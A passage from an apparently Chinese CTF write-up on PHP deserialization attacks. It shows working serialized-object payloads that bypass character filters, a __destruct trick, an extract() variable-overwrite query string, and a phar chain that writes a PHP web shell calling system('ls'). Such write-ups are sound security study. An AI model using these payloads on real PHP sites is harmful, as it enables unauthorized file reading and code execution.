<span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="variable">$i</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="variable">$i</span>-<span class="number">2</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">decorate</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// function is_valid($s) &#123;</span></span><br><span class="line"><span class="comment">//     for($i = 0; $i &lt; strlen($s); $i++)</span></span><br><span class="line"><span class="comment">//         if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span></span><br><span class="line"><span class="comment">//             return false;</span></span><br><span class="line"><span class="comment">//     return true;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     $str = (string)$_GET[&#x27;str&#x27;];</span></span><br><span class="line"><span class="comment">//     if(is_valid($str)) &#123;</span></span><br><span class="line"><span class="comment">//         $obj = unserialize($str);</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>

<p>发现确实找到了小s 然后再写一个字符替换</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// function __construct() &#123;</span></span><br><span class="line">    <span class="comment">//     $op = &quot;1&quot;;</span></span><br><span class="line">    <span class="comment">//     $filename = &quot;/tmp/tmpfile&quot;;</span></span><br><span class="line">    <span class="comment">//     $content = &quot;Hello World!&quot;;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;process();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function process() &#123;</span></span><br><span class="line">    <span class="comment">//     if($this-&gt;op == &quot;1&quot;) &#123;</span></span><br><span class="line">    <span class="comment">//         $this-&gt;write();</span></span><br><span class="line">    <span class="comment">//     &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span></span><br><span class="line">    <span class="comment">//         $res = $this-&gt;read();</span></span><br><span class="line">    <span class="comment">//         $this-&gt;output($res);</span></span><br><span class="line">    <span class="comment">//     &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//         $this-&gt;output(&quot;Bad Hacker!&quot;);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// private function write() &#123;</span></span><br><span class="line">    <span class="comment">//     if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span></span><br><span class="line">    <span class="comment">//         if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span></span><br><span class="line">    <span class="comment">//             $this-&gt;output(&quot;Too long!&quot;);</span></span><br><span class="line">    <span class="comment">//             die();</span></span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//         $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span></span><br><span class="line">    <span class="comment">//         if($res) $this-&gt;output(&quot;Successful!&quot;);</span></span><br><span class="line">    <span class="comment">//         else $this-&gt;output(&quot;Failed!&quot;);</span></span><br><span class="line">    <span class="comment">//     &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//         $this-&gt;output(&quot;Failed!&quot;);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// private function read() &#123;</span></span><br><span class="line">    <span class="comment">//     $res = &quot;&quot;;</span></span><br><span class="line">    <span class="comment">//     if(isset($this-&gt;filename)) &#123;</span></span><br><span class="line">    <span class="comment">//         $res = file_get_contents($this-&gt;filename);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     return $res;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// private function output($s) &#123;</span></span><br><span class="line">    <span class="comment">//     echo &quot;[Result]: &lt;br&gt;&quot;;</span></span><br><span class="line">    <span class="comment">//     echo $s;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// function __destruct() &#123;</span></span><br><span class="line">    <span class="comment">//     if($this-&gt;op === &quot;2&quot;)</span></span><br><span class="line">    <span class="comment">//         $this-&gt;op = &quot;1&quot;;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;content = &quot;&quot;;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;process();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo urlencode(serialize(new FileHandler));</span></span><br><span class="line"><span class="comment">// O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D</span></span><br><span class="line"><span class="comment">// 因为上传的时候存在检测ascii码存在一定的范围</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">FileHandler</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$arr</span>[<span class="variable">$i</span>],<span class="string">&quot;\0&quot;</span>) != <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="variable">$i</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="variable">$i</span>-<span class="number">2</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$i</span>-<span class="number">2</span>] = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="variable">$arr</span>[<span class="variable">$i</span>-<span class="number">2</span>]);</span><br><span class="line">            <span class="variable">$arr</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\0&quot;</span>,<span class="string">&#x27;\00&#x27;</span>,<span class="variable">$arr</span>[<span class="variable">$i</span>]); <span class="comment">//注意区分单引号双引号</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;替换后:&quot;</span>.<span class="variable">$arr</span>[<span class="variable">$i</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;替换后:&quot;</span>.<span class="variable">$arr</span>[<span class="variable">$i</span>-<span class="number">2</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//拼接回来</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">join</span>(<span class="string">&#x27;:&#x27;</span>,<span class="variable">$arr</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decorate</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// function is_valid($s) &#123;</span></span><br><span class="line"><span class="comment">//     for($i = 0; $i &lt; strlen($s); $i++)</span></span><br><span class="line"><span class="comment">//         if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span></span><br><span class="line"><span class="comment">//             return false;</span></span><br><span class="line"><span class="comment">//     return true;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     $str = (string)$_GET[&#x27;str&#x27;];</span></span><br><span class="line"><span class="comment">//     if(is_valid($str)) &#123;</span></span><br><span class="line"><span class="comment">//         $obj = unserialize($str);</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot; * op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">11</span>:<span class="string">&quot; * filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot; * content&quot;</span>;N;&#125;</span><br><span class="line"><span class="string">&quot; * op&quot;</span>;i</span><br><span class="line">&#123;s</span><br><span class="line">替换后:<span class="string">&quot;\00*\00op&quot;</span>;i</span><br><span class="line">替换后:&#123;S</span><br><span class="line"><span class="string">&quot; * filename&quot;</span>;s</span><br><span class="line"><span class="number">2</span>;s</span><br><span class="line">替换后:<span class="string">&quot;\00*\00filename&quot;</span>;s</span><br><span class="line">替换后:<span class="number">2</span>;S</span><br><span class="line"><span class="string">&quot; * content&quot;</span>;N;&#125;</span><br><span class="line"><span class="string">&quot;flag.php&quot;</span>;s</span><br><span class="line">替换后:<span class="string">&quot;\00*\00content&quot;</span>;N;&#125;</span><br><span class="line">替换后:<span class="string">&quot;flag.php&quot;</span>;S</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\00*\00op&quot;</span>;i:<span class="number">2</span>;S:<span class="number">11</span>:<span class="string">&quot;\00*\00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;S:<span class="number">10</span>:<span class="string">&quot;\00*\00content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p>之所以会产生这些不可见0字符 是因为protected和private属性的原因导致 所以需要我们进行替换</p>
<p>传入后查看页面源代码成功获取flag：</p>
<p><img src="/.com//17476574315877288923840810046356-20250519202352-rzwpee6.png" alt="17476574315877288923840810046356"></p>
<p>同时这道题目也可以装瞎 把protected的属性改成public进行攻击</p>
<p>但是当时这道题目在读取文件<strong>析构函数切目录</strong>的时候不在当前目录 需要获取其绝对路径进行读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;/proc/self/cmdline&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">FileHandler</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>;</span><br></pre></td></tr></table></figure>

<p>第二种方法 提前结束 快速析构</p>
<p>把属性值修改</p>
<p>​<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code>​</p>
<p>改为</p>
<p>​<code>O:11:&quot;FileHandler&quot;:4:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code>​</p>
<p>或者删除结尾的大括号</p>
<p>​<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;</code>​</p>
<p>‍</p>
<h2 id="phar例题："><a href="#phar例题：" class="headerlink" title="phar例题："></a>phar例题：</h2><p><strong>X-NUCA 2020 Final</strong></p>
<ol>
<li>变量覆盖读template.php</li>
<li>变量覆盖写入无损phar文件</li>
<li>变量覆盖触发phar反序列化</li>
</ol>
<p>题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/uploads/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$sandbox</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;template.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//                key     value</span></span><br><span class="line"><span class="variable">$template</span> = <span class="keyword">array</span>(<span class="string">&#x27;tp1&#x27;</span>=&gt;<span class="string">&#x27;tp1.tpl&#x27;</span>,<span class="string">&#x27;tp2&#x27;</span>=&gt;<span class="string">&#x27;tp2.tpl&#x27;</span>,<span class="string">&#x27;tp3&#x27;</span>=&gt;<span class="string">&#x27;tp3.tpl&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//看似多余的东西往往是解题的关键</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>], EXTR_OVERWRITE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tp&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$tp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;tp&#x27;</span>];</span><br><span class="line">       <span class="comment">//  判断tp是否为template中的key</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$tp</span>, <span class="variable">$template</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;No! You only have 3 template to reader&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//读取文件</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$template</span>[<span class="variable">$tp</span>]);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title class_">Template</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please choice one template to reader&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><strong>小技巧：</strong>  在源代码中看似没有一点用处的东西可能会成为解题的关键 比如在这里面存在着extract方法，可以用于变量覆盖</p>
<p>分析题目我们发现 想要读取文件 只能是在template数组中进行读取 但是其内容已经写好固定了，所以需要我们对template数组进行变量覆盖</p>
<p>对var数组进行操作 去读取template.php文件的内容</p>
<p>key value</p>
<p>array(‘template’ =&gt; array(‘tp1’ =&gt; ‘template.php’))</p>
<p>把template数组中的tp1这个key 的 value换成 template.php</p>
<p>即传参<code>?var[template][tp1]=template.php</code>​</p>
<p><img src="/.com//17476580781468024852844359025089-20250519203439-s946w93.png" alt="17476580781468024852844359025089"></p>
<p>对upload后面的开始访问：<a target="_blank" rel="noopener" href="http://122.114.252.87:1120/uploads/7cddc639132e5953bf969cc3c9b08fd7/67c8a41ae1c9406576160aaf0370816e.html">http://122.114.252.87:1120/uploads/7cddc639132e5953bf969cc3c9b08fd7/67c8a41ae1c9406576160aaf0370816e.html</a></p>
<p>得到一段php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$pattern</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$suffix</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;pattern = <span class="string">&quot;/&#123;&#123;([a-z]+)&#125;&#125;/&quot;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;suffix = <span class="string">&quot;.html&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//必须利用里面的break跳出死循环 才能到危险函数</span></span><br><span class="line">		<span class="keyword">while</span> (True) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$this</span>-&gt;pattern, <span class="variable">$this</span>-&gt;content, <span class="variable">$matches</span>)!==<span class="number">1</span>) </span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">global</span> $&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>($&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;)) &#123;</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;content = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$this</span>-&gt;pattern, $&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//suffic的长度必须大于5</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;suffix)&gt;<span class="number">5</span>) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;error suffix&quot;</span>;</span><br><span class="line">			<span class="keyword">die</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$filename</span> = <span class="string">&#x27;/var/www/html/uploads/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;content) . <span class="variable language_">$this</span>-&gt;suffix;</span><br><span class="line">        <span class="comment">//危险函数 需要走过来嗷</span></span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Your html file is in &quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为在这个类中存在获取文件的方法 但是没有反序列化的途径 所以很明显嗷 这是个<strong>phar</strong>的问题</p>
<p>根据phar的条件进行解题探索</p>
<p>file_put_contents： phar可利用的函数</p>
<p>先构造pop链生成phar文件</p>
<p>本地测试时注意修改我们的php.ini的配置文件</p>
<p> <img src="/.com//17476581091664899805473643872117-20250519203510-1ovs32j.png" alt="17476581091664899805473643872117"></p>
<p>避大坑！！！！ 可能我们修改了之后 但是在vscode中无法操作成功 原因在于版本不匹配</p>
<p>姿势1：修改ini之后 直接在本地访问该网页 然后就会在同级目录生成对应文件</p>
<p>姿势2：在cmd中输入<code>php -v</code>​查看一下电脑环境的默认php版本</p>
<p><img src="/.com//17476581185514129733610710164602-20250519203519-4vcfew4.png" alt="17476581185514129733610710164602"></p>
<p>然后在phpStudy中修改对于版本的ini文件进行访问</p>
<p>想要file_get_contents读取到我们的phar.phar的内容有两种方法：</p>
<ol>
<li>file_get_contents可以发起http请求 只需要我们把phar文件写到服务器上就可以</li>
<li>file_get_contents读取data:&#x2F;&#x2F;协议</li>
</ol>
<p><strong>data:&#x2F;&#x2F;的使用方式：</strong></p>
<p>首先构造好反序列化的payload 然后在尾部添加上phar的八股文</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$pattern</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$suffix</span> = <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Template</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span 